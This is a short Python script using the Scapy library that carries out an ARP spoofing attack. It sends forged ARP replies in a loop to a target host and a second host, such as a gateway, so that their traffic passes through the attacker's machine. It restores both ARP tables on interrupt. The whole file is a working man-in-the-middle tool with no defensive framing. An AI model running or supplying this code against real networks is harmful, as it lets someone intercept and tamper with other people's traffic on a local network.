from scapy.layers.l2 import ARP
from scapy.layers.l2 import getmacbyip
from scapy.layers.l2 import get_if_hwaddr
from scapy.all import send
import sys


def arp_spoof(target_ip, target_mac, sender_ip):
    sender_mac = get_if_hwaddr(intf)
    packet = ARP(op="is-at", hwsrc=sender_mac, psrc=sender_ip,
                 hwdst=target_mac, pdst=target_ip ) #Create arp replay packet to poisoning victim's arp table
    send(packet, verbose=False)

def arp_restore(target_ip, target_mac, sender_ip, sender_mac):
    packet = ARP(op="is-at", hwsrc=sender_mac, psrc=sender_ip,
                 hwdst=target_mac, pdst=target_ip ) #Create arp replay packet to restore victim's arp table
    send(packet, verbose=False)


if __name__ == "__main__":
    intf, t_ip, r_ip  = sys.argv[1], sys.argv[2], sys.argv[3]
    t_mac = getmacbyip(t_ip)
    r_mac = getmacbyip(r_ip)

    try:
        print("Sending spoofed ARP packets")
        while True:
            arp_spoof(t_ip, t_mac, r_ip)
            arp_spoof(r_ip, r_mac, t_ip)
    except KeyboardInterrupt:
        print(f"Sending restoring ARP packets to {t_ip}({t_mac})")
        arp_restore(t_ip, t_mac, r_ip, r_mac)
        print(f"Sending restoring ARP packets to {r_ip}({r_mac})")
        arp_restore(r_ip, r_mac, t_ip, t_mac)
        quit()